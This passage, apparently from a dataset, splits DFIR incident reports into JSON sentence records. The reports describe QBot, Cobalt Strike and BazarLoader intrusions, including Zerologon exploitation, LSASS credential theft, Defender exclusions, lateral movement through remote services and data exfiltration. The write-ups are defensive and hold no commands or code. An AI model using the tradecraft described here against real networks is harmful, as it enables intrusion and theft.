        "text": "The execution chain for this QBot infection can be seen below:\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 15,
        "index": 5493
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S16",
        "text": "We analyzed the registry path and associated keys that were queried by the scheduled task HKCU:\\SOFTWARE\\Pvoeooxf and discovered that three keys were created containing base64 encoded values.",
        "type": "",
        "report": "r-dfir-17",
        "line": 16,
        "index": 5494
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S17",
        "text": "Decoding the values resulted in:\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 17,
        "index": 5495
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S18",
        "text": "- Copy of QBot DLL\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 18,
        "index": 5496
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S19",
        "text": "- obfuscated PowerShell script that is referenced by the scheduled task.\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 19,
        "index": 5497
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S20",
        "text": "The PowerShell script (triggered by the scheduled task) starts off a chain of events which is illustrated below:\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 20,
        "index": 5498
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S21",
        "text": "When run for the first time, the script creates a new registry key entry in the same path, saving the date of execution.",
        "type": "",
        "report": "r-dfir-17",
        "line": 21,
        "index": 5499
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S22",
        "text": "It then verifies upon execution if the creation date key of this registry key is older than 4 hours.\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 22,
        "index": 5500
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S23",
        "text": "Based on the outcome, it will either: (1) retrieve the base64-encoded Qbot payload from the Windows Registry, decode it, save it on the file system and execute it.",
        "type": "",
        "report": "r-dfir-17",
        "line": 23,
        "index": 5501
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S24",
        "text": "OR (2) Fetch the QBot payload remotely using one of the active C2 IPs using the Invoke-WebRequest PowerShell module:\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 24,
        "index": 5502
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S25",
        "text": "The PS script contains built-in logic to execute various types of payloads including batch and Visual Basic files.",
        "type": "",
        "report": "r-dfir-17",
        "line": 25,
        "index": 5503
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S26",
        "text": "The encoded QBot DLL that was stored in the registry, was dropped in the directory %APPDATA%\\Roaming\\Microsoft\\Fdopitcu .",
        "type": "",
        "report": "r-dfir-17",
        "line": 26,
        "index": 5504
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S27",
        "text": "The unsigned DLL, with descriptor Cancel Autoplay 2 was executed using regsvr32.exe\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 27,
        "index": 5505
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S28",
        "text": "Upon execution of this second-stage DLL, various registry keys were created in HKCU\\Software\\Microsoft\\Yerqbqokc.",
        "type": "",
        "report": "r-dfir-17",
        "line": 28,
        "index": 5506
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S29",
        "text": "In addition, a new instance of explorer.exe (32-bit) was started and injected into.\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 29,
        "index": 5507
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S30",
        "text": "The registry keys contain eight-character long hex strings for which we believe is part of the malware\u2019s encrypted config.\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 30,
        "index": 5508
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S31",
        "text": "The scheduled task created by Qbot was set to run every 30 minutes and executes a base64 encoded payload stored in the Windows Registry.\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 31,
        "index": 5509
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S32",
        "text": "Thirty minutes after gaining initial access, the threat actors ran an executable file on the beachhead to exploit CVE-2020-1472, Zerologon.\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 32,
        "index": 5510
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S33",
        "text": "Three milliseconds after the exploit, an event 4742 \u201cA computer account was changed.\u201d was generated on the targeted Domain Controller.\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 33,
        "index": 5511
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S34",
        "text": "As explained in a detailed blog from CrowdStrike, the ZeroLogon CVE relies on the AES-CFB8 algorithm used with a zero IV :\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 34,
        "index": 5512
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S35",
        "text": "\u201cIn order to use AES-CFB8 securely, a random initialization vector (IV) needs to be generated for every plaintext to be encrypted using the same key.",
        "type": "",
        "report": "r-dfir-17",
        "line": 35,
        "index": 5513
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S36",
        "text": "However, the ComputeNetlogonCredential function sets the IV to a fixed value of 16 zero bytes.",
        "type": "",
        "report": "r-dfir-17",
        "line": 36,
        "index": 5514
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S37",
        "text": "This results in a cryptographic flaw in which encryption of 8-bytes of zeros could yield a ciphertext of zeros with a probability of 1 in 256.",
        "type": "",
        "report": "r-dfir-17",
        "line": 37,
        "index": 5515
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S38",
        "text": "Another implementation issue that allows this attack is that unencrypted Netlogon sessions aren\u2019t rejected by servers (by default).",
        "type": "",
        "report": "r-dfir-17",
        "line": 38,
        "index": 5516
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S39",
        "text": "The combination of these two flaws could allow an attacker to completely compromise the authentication, and thus to impersonate a server of their choice.\u201d\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 39,
        "index": 5517
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S40",
        "text": "As we can see on the network captures, a brute-force attack was performed in order to spoof the identity of the domain controller :\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 40,
        "index": 5518
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S41",
        "text": "After the end of the brute force traffic, we can see a single instance where a the exploit has completed successfully.\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 41,
        "index": 5519
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S42",
        "text": "After being successfully authenticated, the DC password was set:\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 42,
        "index": 5520
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S43",
        "text": "We can also see that the SubjectUserName is ANONYMOUS LOGON.\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 43,
        "index": 5521
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S44",
        "text": "After authenticating to the DC with the DC account, the threat actors dumped the Domain Admin hash, and then reset the DC password in order to unbreak the Active Directory Domain.\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 44,
        "index": 5522
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S45",
        "text": "The explorer shell was also restarted by the threat actor:\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 45,
        "index": 5523
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S46",
        "text": "Upon execution of the initial DLL, QBot uses process hollowing to start a suspended instance of explorer.exe (32-bit) and then injects itself into this process.\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 46,
        "index": 5524
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S47",
        "text": "The injected explorer.exe process was used to spawn and inject into additional instances of explorer.exe (32-bit).",
        "type": "",
        "report": "r-dfir-17",
        "line": 47,
        "index": 5525
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S48",
        "text": "An example event can be seen below.",
        "type": "",
        "report": "r-dfir-17",
        "line": 48,
        "index": 5526
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S49",
        "text": "Source PID 10492 belonging to QBot, injected a DLL into PID 4072 which we discovered was part of Cobalt Strike C2 communication.",
        "type": "",
        "report": "r-dfir-17",
        "line": 49,
        "index": 5527
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S50",
        "text": "The threat actor obtained the NTLM hash value of the administrator account through the Zerologon exploit and used over-pass-the-hash We have seen the use of over-pass-the-hash several times before.",
        "type": "",
        "report": "r-dfir-17",
        "line": 50,
        "index": 5528
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S51",
        "text": "For example, our Cobalt Strike Defender Guide covers detection of this technique in more detail.\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 51,
        "index": 5529
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S52",
        "text": "Soon after, a TGT for the administrator account was requested:\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 52,
        "index": 5530
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S53",
        "text": "QBot initially starts a number of processes to collect information about the affected system.",
        "type": "",
        "report": "r-dfir-17",
        "line": 53,
        "index": 5531
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S54",
        "text": "This is part of the \u201cSYSTEM INFO\u201d bot request, as described in a recent article from SecureList.\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 54,
        "index": 5532
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S55",
        "text": "Later, more discovery commands were executed via the Cobalt Strike beacon, which gathered information about the active directory environment.\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 55,
        "index": 5533
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S56",
        "text": "Ping was used to verify machines were online\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 56,
        "index": 5534
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S57",
        "text": "Through the creation of Windows services, Cobalt Strike Beacons (psexec_psh function) were deployed on multiple hosts within the environment.",
        "type": "",
        "report": "r-dfir-17",
        "line": 57,
        "index": 5535
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S58",
        "text": "Multiple services were installed by Cobalt Strike across the environment, here are a few examples:\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 58,
        "index": 5536
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S59",
        "text": "first calls to create the service remotely, then starts it with StartServiceA function:\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 59,
        "index": 5537
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S60",
        "text": "RDP/interactive Logins\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 60,
        "index": 5538
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S61",
        "text": "Increase the max RDP connections allowed, in this case a arbitrarily large number.",
        "type": "",
        "report": "r-dfir-17",
        "line": 61,
        "index": 5539
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S62",
        "text": "Makes sure the RDP listener is enabled.",
        "type": "",
        "report": "r-dfir-17",
        "line": 62,
        "index": 5540
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S63",
        "text": "Makes sure the user is allowed to RDP to the terminal server.",
        "type": "",
        "report": "r-dfir-17",
        "line": 63,
        "index": 5541
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S64",
        "text": "Makes sure the terminal server is set to enabled.\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 64,
        "index": 5542
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S65",
        "text": "Makes sure terminal services is set to remote admin mode.\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 65,
        "index": 5543
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S66",
        "text": "Makes sure that the terminal service will start idle sessions.",
        "type": "",
        "report": "r-dfir-17",
        "line": 66,
        "index": 5544
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S67",
        "text": "Enables advertisement of the terminal server.\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 67,
        "index": 5545
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S68",
        "text": "Makes sure terminal server is set to allow connections.",
        "type": "",
        "report": "r-dfir-17",
        "line": 68,
        "index": 5546
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S69",
        "text": "Makes sure terminal server is set to simultaneous sessions.\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 69,
        "index": 5547
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S70",
        "text": "Makes sure multiple sessions are allowed.\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 70,
        "index": 5548
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S71",
        "text": "Starts the terminal services and sets service to autostart.\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 71,
        "index": 5549
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S72",
        "text": "The base64 encoded payload can be decoded using this Cyberchef recipe (shout out @0xtornado) which represents a SMB beacon that creates the named pipe \u201cdce_3d\u201d.",
        "type": "",
        "report": "r-dfir-17",
        "line": 72,
        "index": 5550
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S73",
        "text": "Here is the initial access DLL (Qbot) information from Tria.ge\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 73,
        "index": 5551
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S74",
        "text": "While the threat actors were active in the environment, we received 3 different alerts stating that someone had opened canary documents from the IP address 91.193.182[.]165.",
        "type": "",
        "report": "r-dfir-17",
        "line": 74,
        "index": 5552
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S75",
        "text": "These alerts tell us that data was indeed exfiltrated from the environment.",
        "type": "",
        "report": "r-dfir-17",
        "line": 75,
        "index": 5553
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S76",
        "text": "The threat actors were most interested in files concerning financial statements, ransomware reports, and salary data.\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 76,
        "index": 5554
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S77",
        "text": "The C2 channel was encrypted and multiple connections were established with the internal file server.",
        "type": "",
        "report": "r-dfir-17",
        "line": 77,
        "index": 5555
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S78",
        "text": "No other traffic was observed for possible exfiltration leading us to the conclusion that the command and control channel was used for the exfiltration.\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 78,
        "index": 5556
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S79",
        "text": "At 17:35 UTC, the Cobalt Strike Beacon was deployed on the File Server.\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 79,
        "index": 5557
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S80",
        "text": "Spike in traffic from file share server to Cobalt Strike command and control server.",
        "type": "",
        "report": "r-dfir-17",
        "line": 80,
        "index": 5558
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S0",
        "text": "We did not observe the initial access for this case but assess with medium to high confidence that a malicious email campaign was used to deliver an Excel (xls) document.",
        "type": "",
        "report": "r-dfir-18",
        "line": 0,
        "index": 5559
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S1",
        "text": "Following the opening of the xls document, the initial Qbot DLL loader was downloaded and saved to disk.",
        "type": "",
        "report": "r-dfir-18",
        "line": 1,
        "index": 5560
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S2",
        "text": "Interestingly, the name of the DLL contained a .html extension to disguise the portable executable nature of the payload.",
        "type": "",
        "report": "r-dfir-18",
        "line": 2,
        "index": 5561
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S3",
        "text": "Once executed, the Qbot process creates a scheduled task to elevate itself to system.",
        "type": "",
        "report": "r-dfir-18",
        "line": 3,
        "index": 5562
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S4",
        "text": "Qbot injected into many processes but one favorite in this intrusion, was Microsoft Remote Assistance (msra.exe).",
        "type": "",
        "report": "r-dfir-18",
        "line": 4,
        "index": 5563
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S5",
        "text": "Within minutes of landing on the beachhead, a series of discovery commands were executed using Microsoft utilities.",
        "type": "",
        "report": "r-dfir-18",
        "line": 5,
        "index": 5564
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S6",
        "text": "Around the same time, LSASS was access by Qbot to collect credentials from memory.",
        "type": "",
        "report": "r-dfir-18",
        "line": 6,
        "index": 5565
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S7",
        "text": "Thirty minutes after initial access, Qbot was observed collecting data from the beachhead host including browser data and emails from Outlook.",
        "type": "",
        "report": "r-dfir-18",
        "line": 7,
        "index": 5566
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S8",
        "text": "At around 50 minutes into the infection, the beachhead host copied a Qbot dll to an adjacent workstation, which was then executed by remotely creating a service.",
        "type": "",
        "report": "r-dfir-18",
        "line": 8,
        "index": 5567
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S9",
        "text": "Minutes later, the beachhead host did the same thing to another adjacent workstation and then another, and before we knew it, all workstations in the environment were compromised.\n",
        "type": "",
        "report": "r-dfir-18",
        "line": 9,
        "index": 5568
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S10",
        "text": "Qbot followed it\u2019s normal process on each machine.",
        "type": "",
        "report": "r-dfir-18",
        "line": 10,
        "index": 5569
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S11",
        "text": "Servers were not accessed in this intrusion.",
        "type": "",
        "report": "r-dfir-18",
        "line": 11,
        "index": 5570
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S12",
        "text": "After this activity, normal beaconing occurred but no further actions on objectives were seen.\n",
        "type": "",
        "report": "r-dfir-18",
        "line": 12,
        "index": 5571
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S13",
        "text": "We assess with medium to high confidence that the QBot infection was delivered to the system via a malspam campaign through a hidden 4.0 Macro\u2019s in Excel.\n",
        "type": "",
        "report": "r-dfir-18",
        "line": 13,
        "index": 5572
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S14",
        "text": "We believe this is the xls file that lead to the Qbot infection, due to the overlap in time period, download url, and file name.",
        "type": "",
        "report": "r-dfir-18",
        "line": 14,
        "index": 5573
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S15",
        "text": "The QBot dll was executed on the system and shortly after, injected into the msra.exe process.\n",
        "type": "",
        "report": "r-dfir-18",
        "line": 15,
        "index": 5574
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S16",
        "text": "A scheduled task was created by Qbot to escalate to SYSTEM privileges.",
        "type": "",
        "report": "r-dfir-18",
        "line": 16,
        "index": 5575
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S17",
        "text": "This scheduled task was created by the msra.exe process, to be run only once, a few minutes after its creation.\n",
        "type": "",
        "report": "r-dfir-18",
        "line": 17,
        "index": 5576
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S18",
        "text": "QBot was observed injecting into msra.exe process on multiple systems.\n",
        "type": "",
        "report": "r-dfir-18",
        "line": 18,
        "index": 5577
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S19",
        "text": "Multiple folders were added to the Windows Defender Exclusions list in order to prevent the Qbot dll placed inside of it from being detected.",
        "type": "",
        "report": "r-dfir-18",
        "line": 19,
        "index": 5578
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S20",
        "text": "The newly dropped dll was then executed and process injected into msra.exe.\n",
        "type": "",
        "report": "r-dfir-18",
        "line": 20,
        "index": 5579
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S21",
        "text": "Qbot used reg.exe to add Defender folder exceptions for folders within AppData and ProgramData.\n",
        "type": "",
        "report": "r-dfir-18",
        "line": 21,
        "index": 5580
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S22",
        "text": "dll files dropped by Qbot, were deleted after injection into msra.exe.\n",
        "type": "",
        "report": "r-dfir-18",
        "line": 22,
        "index": 5581
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S23",
        "text": "LSASS was accessed by Qbot, with the intention of accessing credentials.",
        "type": "",
        "report": "r-dfir-18",
        "line": 23,
        "index": 5582
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S24",
        "text": "This can be observed through the Sysmon process access event, indicating the GrantedAccess value of 0x1410 .\n",
        "type": "",
        "report": "r-dfir-18",
        "line": 24,
        "index": 5583
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S25",
        "text": "Additional evidence of LSASS access was visible in API calls from Qbot injected processes to LSASS.\n",
        "type": "",
        "report": "r-dfir-18",
        "line": 25,
        "index": 5584
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S26",
        "text": "The following discovery commands where observed coming from the Qbot processes.",
        "type": "",
        "report": "r-dfir-18",
        "line": 26,
        "index": 5585
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S27",
        "text": "These commands where executed on the beachhead system along with other workstations compromised through lateral movement.\n",
        "type": "",
        "report": "r-dfir-18",
        "line": 27,
        "index": 5586
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S28",
        "text": "Qbot moved laterally to all workstations in the environment by copying a dll to the machine and then remotely creating a service to execute the Qbot dll.",
        "type": "",
        "report": "r-dfir-18",
        "line": 28,
        "index": 5587
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S29",
        "text": "The services created had the DeleteFlag set causing the service to be removed upon reboot.\n",
        "type": "",
        "report": "r-dfir-18",
        "line": 29,
        "index": 5588
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S30",
        "text": "The following occurred on each workstation:\n",
        "type": "",
        "report": "r-dfir-18",
        "line": 30,
        "index": 5589
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S31",
        "text": "The lateral movement activity from the beachhead host was rapid and connections were seen across all workstations in the network.",
        "type": "",
        "report": "r-dfir-18",
        "line": 31,
        "index": 5590
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S32",
        "text": "A view from the memory of the beachhead host shows the injected msra process connecting to hosts across the network.\n",
        "type": "",
        "report": "r-dfir-18",
        "line": 32,
        "index": 5591
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S33",
        "text": "The service creations were also observed via event id 7045 across all hosts.\n",
        "type": "",
        "report": "r-dfir-18",
        "line": 33,
        "index": 5592
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S34",
        "text": "Qbot is widely known to steal emails with the intention of collecting information and performing email thread hijacking.",
        "type": "",
        "report": "r-dfir-18",
        "line": 34,
        "index": 5593
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S35",
        "text": "Email data will be collected and stored in 1 of 2 locations.\n",
        "type": "",
        "report": "r-dfir-18",
        "line": 35,
        "index": 5594
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S36",
        "text": "Once exfiltrated from the system this folder is then deleted as seen below\n",
        "type": "",
        "report": "r-dfir-18",
        "line": 36,
        "index": 5595
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S37",
        "text": "Collection of browser data from Internet Explorer and Microsoft Edge was also observed with Qbot using the built-in utility esentutl.exe.\n",
        "type": "",
        "report": "r-dfir-18",
        "line": 37,
        "index": 5596
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S38",
        "text": "Qbot uses a tiered infrastructure, often using other compromised systems as first tier proxy points for establishing a constantly changing list of C2 endpoints.",
        "type": "",
        "report": "r-dfir-18",
        "line": 38,
        "index": 5597
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S39",
        "text": "You can review a in-depth analysis of the modules of this malware in this Checkpoint report.",
        "type": "",
        "report": "r-dfir-18",
        "line": 39,
        "index": 5598
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S40",
        "text": "With this type of setup the list of C2 from October 2021, has in large rotated out of use.",
        "type": "",
        "report": "r-dfir-18",
        "line": 40,
        "index": 5599
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S41",
        "text": "To keep up to date on current Qbot C2 endpoints you can check out our Threat Feed & All Intel service as we track these changing lists daily.\n",
        "type": "",
        "report": "r-dfir-18",
        "line": 41,
        "index": 5600
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S42",
        "text": "Qbot does use SSL in it\u2019s C2 communication but does not rely soley on port 443 for communication, in the case investigated here the following ports were found in the extracted C2 configuration.\n",
        "type": "",
        "report": "r-dfir-18",
        "line": 42,
        "index": 5601
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S43",
        "text": "Qbot uses SSL and while the domains do not resolve, they follow a pattern and are detectable with several Suricata ETPRO signatures.\n",
        "type": "",
        "report": "r-dfir-18",
        "line": 43,
        "index": 5602
    },
    {
        "id": "dfir-reports-filtered/r-dfir-18.md:::S44",
        "text": "The final actions of the threat actor were not observed, however, the data exfiltrated from the network could be used to conduct further attacks or sold to 3rd parties.\n",
        "type": "",
        "report": "r-dfir-18",
        "line": 44,
        "index": 5603
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S0",
        "text": "The malware (BazarLoader) was delivered to an endpoint via email, which included a link to OneDrive.",
        "type": "",
        "report": "r-dfir-19",
        "line": 0,
        "index": 5604
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S1",
        "text": "The OneDrive link, directed the user to download a file that was a zip, which included an ISO inside.",
        "type": "",
        "report": "r-dfir-19",
        "line": 1,
        "index": 5605
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S2",
        "text": "Once opened (mounted) on the users system, it was determined the ISO contained a LNK file and a DLL.",
        "type": "",
        "report": "r-dfir-19",
        "line": 2,
        "index": 5606
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S3",
        "text": "The LNK file masqueraded as a Document enticing the user to click/open it.",
        "type": "",
        "report": "r-dfir-19",
        "line": 3,
        "index": 5607
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S4",
        "text": "Once the user executed the LNK file, the BazarLoader infection was initiated.",
        "type": "",
        "report": "r-dfir-19",
        "line": 4,
        "index": 5608
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S5",
        "text": "As seen in previous cases, the BazarLoader infection began with internal reconnaissance of the environment using Windows utilities such as net, nltest, and ipconfig.",
        "type": "",
        "report": "r-dfir-19",
        "line": 5,
        "index": 5609
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S6",
        "text": "After being inactive for one hour, the intrusion continued with dropping of multiple Cobalt Strike beacon DLL\u2019s on the beachhead.",
        "type": "",
        "report": "r-dfir-19",
        "line": 6,
        "index": 5610
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S7",
        "text": "This was followed by another round of discovery from the compromised machine.",
        "type": "",
        "report": "r-dfir-19",
        "line": 7,
        "index": 5611
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S8",
        "text": "The threat actor then proceeded with execution of adf.bat, which is a script that queries various Active Directory objects using the AdFind tool.",
        "type": "",
        "report": "r-dfir-19",
        "line": 8,
        "index": 5612
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S9",
        "text": "The first run was using a renamed binary named qq.exe and then the threat actor later dropped a properly named AdFind binary and executed the same discovery commands again.",
        "type": "",
        "report": "r-dfir-19",
        "line": 9,
        "index": 5613
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S10",
        "text": "Soon after that, with the use of another simple batch script named fodhelper_reg_hashes.bat, they performed credentials acquisition via dumping of SAM, SECURITY and SYSTEM registry hives.",
        "type": "",
        "report": "r-dfir-19",
        "line": 10,
        "index": 5614
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S11",
        "text": "Returning after a gap of almost 18 hours, the threat actor performed another round of network scanning from the beachhead.",
        "type": "",
        "report": "r-dfir-19",
        "line": 11,
        "index": 5615
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S12",
        "text": "This was then followed by attempts to Kerberoast and \u201cAS-REProast\u201d using the tool Rubeus.",
        "type": "",
        "report": "r-dfir-19",
        "line": 12,
        "index": 5616
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S13",
        "text": "The threat actor then moved laterally via RDP to a server that contained file shares.",
        "type": "",
        "report": "r-dfir-19",
        "line": 13,
        "index": 5617
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S14",
        "text": "After gaining access to the system they installed a remote access application, AnyDesk, as well as Filezilla.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 14,
        "index": 5618
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S15",
        "text": "The threat actors used FileZilla to exfiltrate data out of the environment.",
        "type": "",
        "report": "r-dfir-19",
        "line": 15,
        "index": 5619
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S16",
        "text": "They then pivoted towards critical systems, such as domain controllers and a server that held backups.",
        "type": "",
        "report": "r-dfir-19",
        "line": 16,
        "index": 5620
    },
    {
        "id": "dfir-reports-filtered/r-dfir-19.md:::S17",
        "text": "The threat actor then dumped LSASS from one of the domain controllers, using task manager, and then uploaded the dump file to ufile.io using Internet Explorer.\n",
        "type": "",
        "report": "r-dfir-19",
        "line": 17,
        "index": 5621
    },
    {
